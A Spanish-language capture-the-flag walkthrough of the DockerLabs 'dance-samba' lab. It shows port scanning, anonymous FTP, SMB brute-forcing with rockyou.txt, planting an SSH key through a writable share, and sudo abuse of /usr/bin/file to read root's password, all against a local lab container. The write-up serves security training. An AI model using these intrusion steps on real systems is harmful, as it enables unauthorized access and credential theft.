---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `FTP` `SMB` `Brute Force` `Information Disclosure` `Cryptography` `Sudoers` 

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip dance-samba.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh dance-samba.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p21,22,139,445 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-15 15:25 +0100
Nmap scan report for 172.17.0.2
Host is up (0.000023s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
|_  256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-02-15T14:25:22
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.91 seconds
```

Vemos abiertos el puerto `21` (FTP), el `22` (SSH) y los puertos `139` y `445` (Samba).

Comenzamos enumerando el servicio `FTP` accediendo con el usuario `anonymous`.

```Bash
ftp 172.17.0.2
```

Info:
```
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:trihack): anonymous 
331 Please specify the password.
Password: 
230 Login successful.
ftp> ls  <---------------
229 Entering Extended Passive Mode (|||9901|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
226 Directory send OK.
ftp> get nota.txt  <--------------
local: nota.txt remote: nota.txt
229 Entering Extended Passive Mode (|||17663|)
100% |**************************************************|    69      923.05 KiB/s    00:00 ETA
226 Transfer complete.
```

Encontramos un archivo nota.txt, lo descargamos y leemos su contenido.

```Bash
cat nota.txt
```

```
I don't know what to do with Macarena, she's obsessed with donald.
```

El mensaje nos revela dos posibles usuarios: `macarena` y `donald`.

## ENUMERACIÓN SMB

A continuación, utilizamos `enum4linux` para enumerar el servicio `SMB` y confirmar la existencia de usuarios.

```Bash
enum4linux -a 172.17.0.2
```

Info:
```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Feb 15 15:27:11 2026

-------------------------------------<MORE OUTPUT>--------------------------------------------------------

 ========================================( Users on 172.17.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: macarena	Name: macarena	Desc: 

user:[macarena] rid:[0x3e8]

 ==================================( Share Enumeration on 172.17.0.2 )==================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	macarena        Disk      
	IPC$            IPC       IPC Service (ccbc84cab2f1 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2

//172.17.0.2/print$	Mapping: DENIED Listing: N/A Writing: N/A
//172.17.0.2/macarena	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_CONNECTION_REFUSED listing \*
//172.17.0.2/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 172.17.0.2 )=============================


[+] Attaching to 172.17.0.2 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] CCBC84CAB2F1
	[+] Builtin


 ===================( Users on 172.17.0.2 via RID cycling (RIDS: 500-550,1000-1050) )===================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-1700207228-1255872715-1172699184 and logon username '', password ''

S-1-5-21-1700207228-1255872715-1172699184-501 CCBC84CAB2F1\nobody (Local User)
S-1-5-21-1700207228-1255872715-1172699184-513 CCBC84CAB2F1\None (Domain Group)
S-1-5-21-1700207228-1255872715-1172699184-1000 CCBC84CAB2F1\macarena (Local User)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1001 Unix User\macarena (Local User)

 ================================( Getting printer info for 172.17.0.2 )================================

No printers returned.


enum4linux complete on Sun Feb 15 15:30:38 2026
```

Vemos que existe el usuario `macarena` que encontramos antes en la pista, pero no podemos acceder a su `recurso compartido` con `sesión nula` ni como invitado.

Vamos a realizar un ataque de `fuerza bruta a SMB` con el usuario `macarena` y el diccionario `rockyou.txt`.

```Bash
netexec smb 172.17.0.2 -u macarena -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

Info:
```
-------------------------------------<MORE OUTPUT>------------------------------------------------
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:ashlee STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:tucker STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:cookie1 STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:shelly STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:catalina STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:147852369 STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:beckham STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:simone STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:nursing STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:iloveyou! STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:eugene STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:torres STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:damian STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:123123123 STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:joshua1 STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:bobby STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:babyface STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [-] CCBC84CAB2F1\macarena:andre STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    CCBC84CAB2F1     [+] CCBC84CAB2F1\macarena:donald     <---------------------
```

Conseguimos credenciales válidas `macarena` : `donald`.

Accedemos al recurso compartido.

```Bash
smbclient //172.17.0.2/macarena -U macarena
```

Info:
```
smb: \> ls
  .                                   D        0  Mon Aug 19 19:26:02 2024
  ..                                  D        0  Mon Aug 19 19:26:02 2024
  user.txt                            N       33  Mon Aug 19 18:20:25 2024
  .bashrc                             H     3771  Mon Aug 19 18:18:51 2024
  .cache                             DH        0  Mon Aug 19 18:40:39 2024
  .bash_logout                        H      220  Mon Aug 19 18:18:51 2024
  .profile                            H      807  Mon Aug 19 18:18:51 2024
  .bash_history                       H        5  Mon Aug 19 19:26:02 2024

		98497780 blocks of size 1024. 56323408 blocks available
```

Veremos que `samba` esta compartiendo de forma local la carpeta del usuario `macarena`. 

Tenemos permisos de escritura, así que aprovecharemos para subir nuestra `clave pública` y acceder por `SSH`.

Creamos el directorio `.ssh` dentro del recurso compartido.

```Bash
mkdir .ssh
```

En la máquina atacante, tenemos que generar un par de claves (pública y privada) y colocar la `clave pública` en el archivo de `authorized_keys` de la víctima. 

De esta forma, el servidor confiará en nuestra clave privada y nos dejará entrar.

```Bash
ssh-keygen -t rsa -b 4096
cp ~/.ssh/id_rsa.pub .
cat id_rsa.pub > authorized_keys
```

Volvemos a `Samba` y subimos los archivos.

```Bash
cd .ssh/
put id_rsa.pub
put authorized_keys
```

Info:
```
smb: \.ssh\> ls
  .                                   D        0  Sun Feb 15 16:00:48 2026
  ..                                  D        0  Sun Feb 15 15:53:58 2026
  id_rsa.pub                          A      738  Sun Feb 15 15:59:15 2026
  authorized_keys                     A      738  Sun Feb 15 16:00:48 2026

		98497780 blocks of size 1024. 56318344 blocks available
smb: \.ssh\>
```

Finalmente, nos conectamos por `SSH` utilizando la clave privada.

```Bash
ssh -i id_rsa macarena@172.17.0.2
```

## ESCALADA DE PRIVILEGIOS

Una vez dentro, enumeramos el sistema y encontramos en `/opt` un archivo `password.txt`, que no tenemos permisos para leer, y en `/home/secret` un archivo llamado `hash`.

```Bash
cat hash
```

```
MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
```

Descubrimos que es una cadena codificada en `Base64` y posteriormente en `Base32`. Procedemos a decodificarla.

```Bash
echo 'MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===' | base32 -d | base64 -d
```

```
supersecurepassword
```

Probamos a autenticarnos con `root` pero no funciona, así que deducimos que es la contraseña de `macarena`.

Comprobamos permisos `sudo` y `SUID`.

```Bash
sudo -l
```

Info:
```
Matching Defaults entries for macarena on ccbc84cab2f1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User macarena may run the following commands on ccbc84cab2f1:
    (ALL : ALL) /usr/bin/file
```

Vemos que podemos ejecutar el binario `/usr/bin/file` como cualquier usuario. Consultamos `GTFOBins` y encontramos cómo utilizar este binario para leer archivos protegidos.

Leemos el archivo `/opt/password.txt` que encontramos anteriormente.

```Bash
sudo /usr/bin/file -f /opt/password.txt
```

```
root:rooteable2: cannot open `root:rooteable2' (No such file or directory)
```

El comando nos devuelve un error que filtra las credenciales de `root` : `rooteable2`.

Nos autenticamos como `root`.

```Bash
su root
```
```
root@ccbc84cab2f1:/home/secret# whoami
root
root@ccbc84cab2f1:/home/secret#
```

Ya somos root!

Obtenemos la `flag`:

```Bash
cat /root/true_root.txt 
```
``` 
efb6984b9b0eb57451aca3f93c8ce6b7
```